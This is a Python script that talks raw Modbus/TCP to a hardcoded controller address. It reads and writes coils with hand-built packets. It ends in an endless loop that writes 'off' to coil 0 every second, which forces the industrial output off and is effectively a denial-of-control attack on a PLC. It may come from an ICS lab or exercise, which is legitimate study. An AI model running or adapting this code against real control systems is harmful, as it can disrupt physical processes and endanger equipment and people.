import sys, os 
import socket
import time
import binascii
from random import *
from hexdump import * 

# Target IP address and port for the Modbus server
IP  = "192.168.2.3"
PORT = 502

# Delay between commands
delay = 0.1

# Function to parse received data from Modbus slave
def parseReceivedData(data):
    value = int(data[-2:], 16)  # Convert the last two characters of the data to an integer
    return value

# Function to build a write command to send to the Modbus slave
def buildWriteCommand(slaveID, regIndex, newData):
    commandList = []
    for index in xrange(regIndex, regIndex + 1):
        indexStr = hex(index)[2:].zfill(4)
        # Construct the Modbus write command
        newData = 0 if newData == 0 else 0xff
        command = "{prefix}{slaveID}{action}{indexStr}{payload:02X}00".format(
            prefix="0e1200000006", slaveID=slaveID, action="05", indexStr=indexStr, payload=newData
        )
        print "[+] Writing to Modbus Slave: Building & Sending data {}".format(command.decode()), index, indexStr, newData
        commandList.append(command)
    return commandList

# Function to build a read command to send to the Modbus slave
def buildReadCommand(slaveID, regIndex):
    commandList = []
    indexStr = hex(regIndex)[2:].zfill(4)
    command = "{prefix}{slaveID}{action}{indexStr}0001".format(
        prefix="000000000006", slaveID=slaveID, action="01", indexStr=indexStr
    )
    commandList.append(command)
    return commandList

# Function to create a socket
def createSocket():
    try:
        skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        return skt
    except socket.error as msg:
        print(msg)

# Function to send data to the Modbus slave
def sendData(commandList):
    #skt = createSocket()
    #skt.connect((IP, PORT))
    for command in commandList:
        try:
            time.sleep(delay)
            hexdump(command.decode('hex'))  # Print the command in hex format
            skt.send(command.decode('hex'))  # Send the command to the slave
        except KeyboardInterrupt:
            print("[-] Exiting...")

# Function to write data to a Modbus slave
def writeFileToModBusSlave(regIndex, newData):
    commandList = buildWriteCommand("01", regIndex, newData)
    sendData(commandList)

# Function to read data from a Modbus slave
def readFromToModBusSlave(regIndex):
    commandList = buildReadCommand("01", regIndex)    
    skt.send(commandList[0].decode('hex'))  # Send the read command
    print "[+] Reading from Modbus Slave: Index - ", 9, " - ", commandList[0]
    dataReceived = skt.recv(1024)  # Receive the data from the slave
    recievedRegData = parseReceivedData(dataReceived.encode("hex"))  # Parse the received data
    print "[+] Received Data    " + dataReceived.encode("hex") + " => " + str(recievedRegData), "(", hex(recievedRegData), ")"
    return recievedRegData
     
# Main function to handle command line arguments and execute the appropriate function
if __name__ == '__main__':
    if len(sys.argv) < 3: 
        print "Usage : {} [-r coil_address]".format(sys.argv[0]) 
        print "                       [-w coil_address]"
        print "command:"
        print "-r address               : Read Coil"
        print "-w address value         : Write Coil"
        sys.exit(1) 
    elif len(sys.argv) == 3:  # Read command
        option = sys.argv[1]
        regIndex = int(sys.argv[2])
    elif len(sys.argv) == 4:  # Write command
        option = sys.argv[1]
        regIndex = int(sys.argv[2])
        newData = int(sys.argv[3])
    
    skt = createSocket()
    skt.connect((IP, PORT))

    if option == "-r":
        RegData = readFromToModBusSlave(regIndex)
        print RegData
    elif option == "-w":
        writeFileToModBusSlave(regIndex, newData)

# Loop to send a turn-off packet repeatedly
while True:
    try:
        writeFileToModBusSlave(0, 0)  # Turn off coil at index 0
        time.sleep(1)  # Wait for 1 second before sending the next packet
    except KeyboardInterrupt:
        print("[-] Exiting...")
        break
